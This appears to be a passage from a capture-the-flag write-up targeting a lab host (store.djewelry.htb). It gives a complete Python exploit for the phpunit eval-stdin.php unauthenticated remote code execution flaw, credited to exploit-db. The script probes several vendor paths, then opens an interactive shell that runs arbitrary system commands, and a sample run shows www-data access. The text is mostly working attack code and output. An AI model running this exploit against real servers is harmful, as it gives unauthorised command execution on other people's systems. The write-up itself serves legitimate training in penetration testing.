Do some googling on the directories found in /vendor/ and find a code execution exploit for phpunit
```python
# phpunit unauthenticated RCE from https://www.exploit-db.com/exploits/50702

import requests
from sys import argv
phpfiles = ["/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"]

def check_vuln(site):
    vuln = False
    try:
        for i in phpfiles:
            site = site+i
            req = requests.get(site,headers= {
                "Content-Type" : "text/html",
                "User-Agent" : f"Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0",
            },data="<?php echo md5(phpunit_rce); ?>")
            if "6dd70f16549456495373a337e6708865" in req.text:
                print(f"Vulnerable: {site}")
                return site 
    except:
        return vuln
def help():
    exit(f"{argv[0]} <site>")

def main():
    if len(argv) < 2:
        help()
    if not "http" in argv[1] or not ":" in argv[1] or not "/" in argv[1]:
        help()
    site = argv[1]
    if site.endswith("/"):
        site = list(site)
        site[len(site) -1 ] = ''
        site = ''.join(site)

    pathvuln = check_vuln(site)
    if pathvuln == False:
        exit("Not vuln")
    try:
        while True:
            cmd = input("> ")
            req = requests.get(str(pathvuln),headers={
                "User-Agent" : f"Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0",
                "Content-Type" : "text/html"
            },data=f'<?php system(\'{cmd}\') ?>')
            print(req.text)
    except Exception as ex:
        exit("Error: " + str(ex))
main()
```
Run this with the URL for the sub domain and get RCE
```bash
python3 exploit.py http://store.djewelry.htb
Vulnerable: http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```